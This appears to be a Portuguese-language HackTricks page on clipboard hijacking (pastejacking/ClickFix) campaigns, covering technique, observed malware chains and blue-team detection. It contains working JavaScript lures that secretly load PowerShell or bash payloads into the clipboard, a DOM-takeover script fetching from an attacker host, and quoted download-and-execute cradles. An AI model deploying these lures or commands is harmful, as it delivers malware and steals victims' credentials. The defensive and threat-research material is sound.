# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole nada que você não copiou você mesmo." – conselho antigo, mas ainda válido

## Visão geral

Clipboard hijacking – também conhecido como *pastejacking* – explora o fato de que usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página web maliciosa (ou qualquer contexto com suporte a JavaScript, como uma aplicação Electron ou Desktop) coloca programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.

Porque **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware commodity como NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Botões de cópia forçada e payloads ocultos (macOS one-liners)

Alguns infostealers para macOS clonam sites de instaladores (por exemplo, Homebrew) e **forçam o uso de um botão “Copy”** para que os usuários não possam selecionar apenas o texto visível. A entrada da área de transferência contém o comando de instalação esperado mais um payload Base64 anexado (por exemplo, `...; echo <b64> | base64 -d | sh`), então um único colar executa ambos enquanto a UI oculta a etapa extra.

## Prova de conceito em JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`, campanhas mais recentes dependem da assíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## Fluxo ClickFix / ClearFake

1. Usuário visita um site typosquatted ou comprometido (ex.: `docusign.sa[.]com`)
2. JavaScript injetado **ClearFake** chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente um one-liner PowerShell codificado em Base64 na área de transferência.
3. Instruções em HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo mais uma DLL maliciosa (classic DLL sideloading).
5. O loader decripta estágios adicionais, injeta shellcode e instala persistência (ex.: scheduled task) – executando, em última instância, NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemplo de cadeia NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) procura em seu diretório por `msvcp140.dll`.
* A DLL maliciosa resolve dinamicamente APIs com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, os descriptografa usando uma chave XOR rotativa `"https://google.com/"`, injeta o shellcode final e descompacta **client32.exe** (NetSupport RAT) em `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Baixa `la.txt` com **curl.exe**
2. Executa o downloader JScript dentro de **cscript.exe**
3. Obtém um payload MSI → coloca `libcef.dll` ao lado de um aplicativo assinado → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** inicia um script PowerShell oculto que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` usando `extrac32` e concatenação de arquivos e, por fim, executa um script `.a3x` que exfiltra credenciais de navegador para `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK com rotação de C2 (PureHVNC)

Algumas campanhas ClickFix dispensam totalmente o download de arquivos e instruem as vítimas a colar um one‑liner que busca e executa JavaScript via WSH, torna-o persistente e altera o C2 diariamente. Exemplo de cadeia observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principais características
- URL ofuscada invertida em runtime para evitar inspeção casual.
- JavaScript persiste via um Startup LNK (WScript/CScript), e seleciona o C2 pelo dia atual – permitindo rápida domain rotation.

Fragmento JS mínimo usado para rotacionar C2s por data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
A próxima etapa costuma implantar um loader que estabelece persistência e puxa um RAT (p.ex., PureHVNC), frequentemente prendendo TLS a um certificado hardcoded e fragmentando o tráfego.

Detection ideas specific to this variant
- Árvore de processos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefatos de inicialização: LNK em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript com um caminho JS sob `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetria de linha de comando contendo `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Repetições de `powershell -NoProfile -NonInteractive -Command -` com grandes payloads stdin para alimentar scripts longos sem linhas de comando extensas.
- Scheduled Tasks que subsequentemente executam LOLBins tais como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sob uma tarefa/caminho com aparência de updater (ex.: `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames e URLs de C2 rotativos diariamente com o padrão `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacione eventos de gravação do clipboard seguidos por colagem Win+R e posterior execução imediata de `powershell.exe`.

Blue-teams podem combinar clipboard, telemetria de criação de processos e do registry para localizar abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico de **Win + R** comandos – procure entradas Base64 / ofuscadas incomuns.
* Security Event ID **4688** (Process Creation) onde `ParentImage` == `explorer.exe` e `NewProcessName` em { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para criações de arquivos sob `%LocalAppData%\Microsoft\Windows\WinX\` ou pastas temporárias imediatamente antes do evento 4688 suspeito.
* EDR clipboard sensors (se presentes) – correlacione `Clipboard Write` seguido imediatamente por um novo processo PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campanhas recentes produzem em massa páginas falsas de verificação CDN/browser ("Just a moment…", estilo IUAM) que coagiam usuários a copiar comandos específicos do OS do seu clipboard para consoles nativos. Isso desloca a execução para fora do sandbox do browser e funciona tanto no Windows quanto no macOS.

Key traits of the builder-generated pages
- Detecção de OS via `navigator.userAgent` para ajustar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionais para OSs não suportados para manter a ilusão.
- Cópia automática para clipboard em ações de UI benignas (checkbox/Copy) enquanto o texto visível pode diferir do conteúdo do clipboard.
- Bloqueio de mobile e um popover com instruções passo a passo: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Ofuscação opcional e single-file injector para sobrescrever o DOM de um site comprometido com uma UI de verificação estilizada com Tailwind (sem necessidade de novo registro de domínio).

Exemplo: discrepância no clipboard + ramificação dependente do OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence da execução inicial
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que a execução continue após o fechamento do terminal, reduzindo artefatos visíveis.

In-place page takeover em sites comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideias de detecção e hunting específicas para iscas estilo IUAM
- Web: Páginas que vinculam Clipboard API a widgets de verificação; incompatibilidade entre texto exibido e payload da área de transferência; ramificação `navigator.userAgent`; Tailwind + single-page replace em contextos suspeitos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` pouco depois de uma interação com o navegador; instaladores batch/MSI executados a partir de `%TEMP%`.
- Endpoint macOS: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` com `nohup` perto de eventos do navegador; jobs em background sobrevivendo ao fechamento do terminal.
- Correlacione o histórico `RunMRU` do Win+R e gravações da área de transferência com a criação subsequente de processos de console.

Veja também — técnicas de suporte

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 — evoluções do fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continua a comprometer sites WordPress e a injetar JavaScript loader que encadeia hosts externos (Cloudflare Workers, GitHub/jsDelivr) e até chamadas de blockchain “etherhiding” (por exemplo, POSTs para endpoints da Binance Smart Chain API como `bsc-testnet.drpc[.]org`) para obter a lógica atual da isca. Overlays recentes usam intensamente fake CAPTCHAs que instruem os usuários a copiar/colar um one-liner (T1204.004) em vez de baixar qualquer coisa.
- A execução inicial está cada vez mais delegada a signed script hosts/LOLBAS. Cadeias de janeiro de 2026 trocaram o uso anterior de `mshta` pelo built-in `SyncAppvPublishingServer.vbs` executado via `WScript.exe`, passando PowerShell-like argumentos com aliases/wildcards para buscar conteúdo remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` é assinado e normalmente usado pelo App-V; emparelhado com `WScript.exe` e argumentos incomuns (`gal`/`gcm` aliases, cmdlets com curinga, jsDelivr URLs) torna-se um estágio LOLBAS de alta relevância para ClearFake.
- Em fevereiro de 2026 os payloads falsos de CAPTCHA retornaram aos download cradles puramente PowerShell. Dois exemplos ao vivo:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- A primeira cadeia é um in-memory `iex(irm ...)` grabber; a segunda realiza stage via `WinHttp.WinHttpRequest.5.1`, escreve um `.ps1` temporário, e então o executa com `-ep bypass` em uma janela oculta.

Detection/hunting tips for these variants
- Sequência de processos: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou PowerShell cradles imediatamente após gravações na área de transferência/Win+R.
- Palavras-chave da linha de comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, ou padrões `iex(irm ...)` com IP cru.
- Network: tráfego de saída para hosts de CDN worker ou blockchain RPC endpoints vindos de hosts de script/PowerShell logo após navegação web.
- File/registry: criação temporária de `.ps1` em `%TEMP%` além de entradas RunMRU contendo esses one-liners; bloquear/alertar sobre signed-script LOLBAS (WScript/cscript/mshta) executando com URLs externas ou strings de alias ofuscadas.

## Mitigations

1. Browser hardening – desabilitar acesso de gravação à área de transferência (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigir gesto do usuário.
2. Security awareness – ensinar usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrários.
4. Network controls – bloquear solicitações de saída para domínios conhecidos de pastejacking e malware C2.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
